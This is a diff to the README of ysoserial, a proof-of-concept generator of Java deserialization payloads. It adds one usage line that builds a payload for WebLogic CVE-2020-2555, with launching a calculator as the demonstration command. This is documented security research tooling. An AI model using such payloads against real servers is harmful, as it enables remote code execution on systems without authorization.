@@ -30,6 +30,11 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 ![logo](ysoserial.png)
 
+weblogic cve-2020-2555
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Weblogic2555 calc
+```
+
 ## Description
 
 Originally released as part of AppSecCali 2015 Talk
